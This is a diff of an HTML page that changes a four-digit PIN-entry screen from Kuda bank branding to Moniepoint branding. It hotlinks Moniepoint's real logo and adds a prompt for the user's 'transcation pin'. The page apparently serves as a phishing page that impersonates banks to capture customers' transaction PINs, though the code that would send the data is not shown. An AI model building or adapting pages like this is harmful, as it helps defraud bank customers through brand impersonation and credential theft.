@@ -4,16 +4,11 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link
+      href="https://atm.moniepoint.com/assets/images/moniepoint-logo.svg"
       rel="icon"
-      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
-      type="image/svg+xml"
+      type="image/x-icon"
     />
-    <link
-      rel="icon"
-      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
-      type="image/png"
-    />
-    <title>Kuda bank</title>
+    <title>Moniepoint</title>
     <link
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
@@ -26,35 +21,24 @@
   <body>
     <div class="container">
       <div class="contentSec">
-        <div class="title">Enter PIN to continue</div>
+        <div class="wrapper">
+          <div class="goBack">
+            <i class="fa-solid fa-arrow-left"></i>
+            <span> Go to login</span>
+          </div>
+          <div class="title">
+            <h1>Enter PIN</h1>
+            <span>Enter your 4-digits transcation pin</span>
+          </div>
+        </div>
       </div>
       <div class="formSec">
         <div class="input">
           <form method="post">
-            <input
-              type="password"
-              id="digit1"
-              class="pin-input"
-              maxlength="1"
-            />
-            <input
-              type="password"
-              id="digit2"
-              class="pin-input"
-              maxlength="1"
-            />
-            <input
-              type="password"
-              id="digit3"
-              class="pin-input"
-              maxlength="1"
-            />
-            <input
-              type="password"
-              id="digit4"
-              class="pin-input"
-              maxlength="1"
-            />
+            <input type="password" id="digit1" class="pin-input" />
+            <input type="password" id="digit2" class="pin-input" />
+            <input type="password" id="digit3" class="pin-input" />
+            <input type="password" id="digit4" class="pin-input" />
           </form>
         </div>
 
